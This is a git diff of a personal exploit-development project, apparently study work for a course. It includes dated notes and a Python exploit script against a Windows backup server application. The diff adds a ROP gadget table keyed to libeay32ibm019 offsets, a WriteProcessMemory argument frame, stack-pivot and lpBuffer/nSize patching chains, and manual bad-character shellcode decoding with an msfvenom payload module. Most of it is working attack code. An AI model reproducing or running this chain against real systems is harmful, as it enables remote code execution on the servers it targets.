@@ -178,17 +178,32 @@ baseDLLAddr + 3c -> PE Header
 baseDLLAddr + PEHeader + 34 -> ImageBase
 
 
-0253_03242026:
+0253-03242026:
 
-0934_03252026:
+0934-03252026:
 11.4.3 Handmade rop decoder
 wrote new module called shellcode.py
 already added a map to swap out bad chars for good chars
 gonna follow the book along to figure out how to use ROP for decoding\\
 
-1238_03252026:
+1238-03252026:
 the vid uses an offset of 0x61e, but mine is just 0x11f
 offset for eax to first bad char
+
+1622-07272026:
+took a long break, feel sick today still
+recover knowledge
+
+1328-07282026:
+- DEP + ASLR was disabled for FBS for some silly reason
+- IDA was used to explore FXCLI_DebugDispatch, FXCLI_OraBR_Exec_Command 
+  & N98E_CRYPTO_get_new_lockid
+    - N98E_CRYPTO_get_new_lockid is used to leak the base address 
+      of libeay32ibm019
+    - FXCLI_DebugDispatch is used to resolve WinAPI functions, 
+      such as WriteProcessMemory
+    - FXCLI_OraBR_Exec_Command is used to send the final buffer to 
+      the server, which will trigger the ROP chain and execute the shellcode
 
 =============================================================================
 
@@ -201,9 +216,6 @@ from struct import pack
 from colorama import Back, Fore, Style, init
 from modules.msfvenom_module import generatePayload
 from modules.shellcode import getShellcode
-from numpy import byte
-from rpyc import lib
-from win32comext import shell
 
 DEBUG = True
 BASE_ADDR_BAD = False
@@ -425,13 +437,34 @@ def main():
         # Target Function Offset observed from loading the dll in IDA was noted
         functionOffset = 0x14E0
 
-        base_addr_libeay32ibm = exportedFunc - functionOffset
+        libeay32ibm019 = exportedFunc - functionOffset
         print(
             Fore.GREEN
-            + f"o Calculated library base via\n\t\t {functions[0].decode("utf-8")}: {Fore.LIGHTYELLOW_EX}{str(hex(base_addr_libeay32ibm))}"
+            + f"o Calculated library base via\n\t\t {functions[0].decode('utf-8')}: {Fore.LIGHTYELLOW_EX}{str(hex(libeay32ibm019))}"
             + Style.RESET_ALL
         )
 
+        """
+        ************************************************************************************
+        ******************************* Stage 0: ROP Gadgets *******************************
+        ************************************************************************************
+        """
+        rop_inc_eax_ret = pack("<L", (libeay32ibm019 + 0x0000BC79))  # inc eax; ret
+        rop_pop_ecx_ret = pack("<L", (libeay32ibm019 + 0x0000117C))  # pop ecx; ret
+        rop_pop_eax_ret = pack("<L", (libeay32ibm019 + 0x00048DB7))  # pop eax; ret
+        rop_neg_eax_ret = pack("<L", (libeay32ibm019 + 0x0001D8C2))  # neg eax ; ret
+        rop_add_eax_ecx_ret = pack("<L", (libeay32ibm019 + 0x0001D0F0))  # add eax, ecx; ret
+        rop_xchg_eax_esp_ret = pack("<L", (libeay32ibm019 + 0x0003A003))  # xchg eax, esp ; ret
+        rop_mov_ptrEAX_ecx_ret = pack("<L", (libeay32ibm019 + 0x00001F7E))  # mov [eax], ecx ; ret
+        rop_add_ptrEAX_1_bh_ret = pack("<L", (libeay32ibm019 + 0x00001E8D))  # add [eax+1], bh; ret
+        rop_push_eax_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x000408DD))  # push eax; pop esi; ret
+        rop_push_esp_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x000408D6))  # push esp; pop esi; ret <- Save ESP to ESI
+        rop_sub_eax_ecx_pop_ebx_ret = pack("<L", (libeay32ibm019 + 0x0004A7B6))  # sub eax, ecx; pop ebx; ret
+        rop_mov_eax_esi_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x000025B7))  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI
+        rop_int3_int3_int3_int3_int3_ret = pack("<L", (libeay32ibm019 + 0x00087E3B))  #  int3; int3; int3; int3; int3; ret; <- debugging
+        rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x10 = pack(
+            "<L", (libeay32ibm019 + 0x0008876D)
+        )  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
         """
         ************************************************************************************
         ************************************ Abuse WPM *************************************
@@ -456,12 +489,12 @@ def main():
         #        which is why the offset is lower than 0x92c04
         #        (0x880B0)
         wpm = pack("<L", (WPMAddr))  # WriteProcessMemory Address
-        wpm += pack("<L", (base_addr_libeay32ibm + 0x92C04))  # Shellcode Return Address
+        wpm += pack("<L", (libeay32ibm019 + 0x92C04))  # Shellcode Return Address
         wpm += pack("<L", (0xFFFFFFFF))  # pseudo Process handle
-        wpm += pack("<L", (base_addr_libeay32ibm + 0x92C04))  # Code cave address
+        wpm += pack("<L", (libeay32ibm019 + 0x92C04))  # Code cave address
         wpm += pack("<L", (0x41414141))  # dummy lpBuffer (Stack address)
         wpm += pack("<L", (0x42424242))  # dummy nSize
-        wpm += pack("<L", (base_addr_libeay32ibm + 0xE401C))  # lpNumberOfBytesWritten = libBase + offset of writable DWORD in .data
+        wpm += pack("<L", (libeay32ibm019 + 0xE401C))  # lpNumberOfBytesWritten = libBase + offset of writable DWORD in .data
         wpm += b"A" * 0x10
 
         offset = b"A" * (276 - len(wpm))
@@ -479,8 +512,8 @@ def main():
         #
         # IGNORE THE ABOVE. REASON:
         #                         restarting the PC gave me a new base address and so now it works as expected
-        # eip = pack("<L", (base_addr_libeay32ibm + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
-        eip = pack("<L", (base_addr_libeay32ibm + 0x000408D6))  # (0x030d08d6) push esp; pop esi; ret <- Save ESP to ESI
+        # eip = pack("<L", (libeay32ibm019 + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
+        eip = rop_push_esp_pop_esi_ret  # <- Save ESP to ESI
         # eip = pack("<L", (0x41424345))  # push esp; pop esi; ret <- Save ESP to ESI
 
         # ! DEBUG: eip: 0x030d08d6
@@ -491,27 +524,8 @@ def main():
         # DD 0D 08 D6   <- this broke the flow, got 00 00 08 D6
 
         # eip = pack("<L", (0xDD0D08D6))  # push esp; pop esi; ret <- Save ESP to ESI
-        print(f"{Fore.GREEN}! DEBUG: eip: {hex(base_addr_libeay32ibm + 0x408D6)}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}! DEBUG: eip: {Fore.YELLOW}{hex(libeay32ibm019 + 0x000408D6)}{Style.RESET_ALL}")
 
-        """
-        ************************************************************************************
-        ******************************* Stage 0: ROP Gadgets *******************************
-        ************************************************************************************
-        """
-        rop_inc_eax_ret = pack("<L", (base_addr_libeay32ibm + 0x0000BC79))  # inc eax; ret
-        rop_pop_ecx_ret = pack("<L", (base_addr_libeay32ibm + 0x0000117C))  # pop ecx; ret
-        rop_neg_eax_ret = pack("<L", (base_addr_libeay32ibm + 0x0001D8C2))  # neg eax ; ret
-        rop_pop_eax_ret = pack("<L", (base_addr_libeay32ibm + 0x00048DB7))  # pop eax; ret
-        rop_add_eax_ecx_ret = pack("<L", (base_addr_libeay32ibm + 0x0001D0F0))  # add eax, ecx; ret
-        rop_xchg_eax_esp_ret = pack("<L", (base_addr_libeay32ibm + 0x0003A003))  # xchg eax, esp ; ret
-        rop_mov_ptrEAX_ecx_ret = pack("<L", (base_addr_libeay32ibm + 0x00001F7E))  # mov [eax], ecx ; ret
-        rop_push_eax_pop_esi_ret = pack("<L", (base_addr_libeay32ibm + 0x000408DD))  # push eax; pop esi; ret
-        rop_sub_eax_ecx_pop_ebx_ret = pack("<L", (base_addr_libeay32ibm + 0x0004A7B6))  # sub eax, ecx; pop ebx; ret
-        rop_mov_eax_esi_pop_esi_ret = pack("<L", (base_addr_libeay32ibm + 0x000025B7))  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI
-        rop_add_ptrEAX_1_bh_ret = pack("<L", (base_addr_libeay32ibm + 0x00001E8D))  # add [eax+1], bh; ret
-        rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x0010 = pack(
-            "<L", (base_addr_libeay32ibm + 0x0008876D)
-        )  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
         """
         ************************************************************************************
         ***************************** Stage 1a: Patch lpBuffer *****************************
@@ -520,12 +534,11 @@ def main():
 
         # Patching lpBuffer, need it to point to our shellcode address on stack
         rop = rop_mov_eax_esi_pop_esi_ret  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI
+        rop += rop_int3_int3_int3_int3_int3_ret
         rop += pack("<L", (0x42424242))  # dummy value
         rop += rop_pop_ecx_ret  # pop ecx; ret
         rop += pack("<L", (0x88888888))  # push huge value to "subtract"
-        rop += pack(
-            "<L", (rop_add_eax_ecx_ret)
-        )  # add eax, ecx; ret -> this will set lpBuffer to point to our shellcode on the stack (EAX - 0x77777D78)
+        rop += rop_add_eax_ecx_ret  # -> this will set lpBuffer to point to our shellcode on the stack (EAX - 0x77777D78)
         rop += rop_pop_ecx_ret  # pop ecx; ret
         rop += pack("<L", (0x77777D78))
         rop += rop_add_eax_ecx_ret  # add eax, ecx; ret
@@ -536,7 +549,7 @@ def main():
         ************************************************************************************
         """
         # 1603_0303:
-        rop += rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x0010  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
+        rop += rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x10  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
         rop += pack("<L", (0x42424242))  # junk into esi
         rop += rop_pop_eax_ret  # pop eax ; ret
         rop += pack("<L", (0x42424242))  # junk for ret 0x10
@@ -549,7 +562,7 @@ def main():
 
         """ 
         ************************************************************************************
-        ****************************** Stage 1c: Patch lpSize ******************************
+        ****************************** Stage 1c: Patch nSize *******************************
         ************************************************************************************
         """
         # 1803_1046:
@@ -562,9 +575,9 @@ def main():
         rop += rop_pop_eax_ret  # pop eax; ret
         rop += pack("<L", (0xFFFFFDF4))  # -524
         rop += rop_neg_eax_ret  # neg eax ; ret
-        rop += rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x0010  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
+        rop += rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x10  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
         rop += pack("<L", (0x42424242))  # junk into esi
-        # rop += pack("<L", (base_addr_libeay32ibm + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
+        # rop += pack("<L", (libeay32ibm019 + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
         rop += rop_mov_ptrEAX_ecx_ret  # mov [eax], ecx ; ret
         rop += pack("<L", (0x42424242))  # junk for ret 0x10
         rop += pack("<L", (0x42424242))  # junk for ret 0x10
@@ -576,10 +589,11 @@ def main():
         *************************** Stage 1d: Shellcode Decoding ***************************
         ************************************************************************************
         """
+        rop += rop_int3_int3_int3_int3_int3_ret  # int3; int3; int3; int3; int3; ret; <- debugging
         rop += rop_pop_ecx_ret  # pop ecx ; ret
-        rop += pack("<L", (0xFFFFFFFF))  # pop ecx ; ret
+        rop += pack("<L", (0xFFFFFFFF))  # negative offset -1
         rop += rop_sub_eax_ecx_pop_ebx_ret  # sub eax, ecx; pop ebx; ret
-        rop += pack("<L", (0x11110111))  # Load 0x01 in BH
+        rop += pack("<L", (0x11110111))  # Load 0x01 in BH -> The original value of the char we needed to replace
         rop += rop_add_ptrEAX_1_bh_ret  # add [eax+1], bh; ret
 
         """
@@ -607,7 +621,7 @@ def main():
         # REASON:: mfsvenom uses a Encoder/Decoder to avoid badchars. This requires the use of writeable memory
         #          which is not available in this case as WPM restores the default protections which were read/exec
         offset2 = b"C" * (0x600 - len(rop))  # This was calculated by subtracting lpBuffer address to the end of our ROP chain
-        shellcode = getShellcode(encoded=True)[:20]  # Get encoded shellcode, moving forward we
+        shellcode = getShellcode(encoded=True)[:20]  # Get encoded shellcode, moving forward we will be using the encoded shellcode
         print(f"{Fore.GREEN}o Encoded Shellcode {Style.RESET_ALL}")
         printBuffer(shellcode, width="db")
 
